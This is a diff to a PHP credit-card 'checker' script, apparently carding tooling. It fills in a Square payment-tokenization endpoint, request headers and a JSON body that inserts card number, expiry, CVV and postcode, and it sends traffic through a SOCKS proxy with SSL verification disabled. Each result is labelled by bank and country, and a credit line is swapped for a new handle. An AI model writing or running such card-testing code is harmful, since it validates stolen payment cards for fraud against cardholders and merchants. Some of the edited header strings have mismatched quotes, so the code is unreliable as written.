@@ -71,15 +71,15 @@ $ch = curl_init();
 //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password"); Uncomment while using Zones
 //////////======= Socks Proxy
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, ' ');
+curl_setopt($ch, CURLOPT_URL, 'https://pci-connect.squareup.com/v2/card-nonce?_=1606740145243.5083&version=df454a84b6');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept:  ',
-'accept-encoding:   ', 
-'content-type:  ',
-'origin:  ',
-'referer:  ',
+'accept: 'application/json',
+'accept-encoding:  'gzip, deflate, br', 
+'content-type: 'application/json; charset=UTF-8',
+'origin: 'https://pci-connect.squareup.com',
+'referer:  'https://pci-connect.squareup.com/v2/iframe?type=main&app_id=sq0idp-z8CTUyrps-v7NMjIfWMKeg&host_name=squareup.com&location_id=LJ3M5V4YAK8N2&version=df454a84b6',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site'));
@@ -89,7 +89,8 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, '  ');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"client_id":"sq0idp-z8CTUyrps-v7NMjIfWMKeg","location_id":"LJ3M5V4YAK8N2","session_id":"MKwhFM9SEjxGeByOgHDMrghNppyhI7qsRXbCve6LcCZi6UQaD4isoBx0gTXprkKcxYf85rzt05Y7ml-rRA==","website_url":"https://squareup.com/","squarejs_version":"df454a84b6","analytics_token":"RK36GK7NQFBDJPUVC4SRLCNYLS5N5HP5EFUB4ABQK4Q6WN7VWTHE7UEE2F2GGV6CGNZPVDE5Z5E6Z4KSOOS6DNYSPIUEDWGF","card_data":{"number":'.$cc.',"exp_month":'.$mes.',"exp_year":'.$ano.',"cvv":".$cvv.","billing_postal_code":".$postcode."}}
+ ');
 
  $result = curl_exec($ch);
  $token = trim(strip_tags(getStr($result1,'"id": "','"')));
@@ -271,7 +272,7 @@ elseif(strpos($result, "Payment cannot be processed, missing credit card number"
      '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Missing Credit Card Number_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
 }
 else {
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Dead Proxy/Error Not listed_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
+    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Dead Proxy/Error Not listed_Devilsescrow」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
 }
 
   curl_close($curl);
@@ -279,4 +280,4 @@ else {
   //////=========Comment Echo $result If U Want To Hide Site Side Response
   echo $result;
 
-///////////////////////////////////////////////===========================Edited By Reboot13================================================\\\\\\\\\\\\\\\
+///////////////////////////////////////////////===========================Edited By DEVILSESCOW================================================\\\\\\\\\\\\\\\
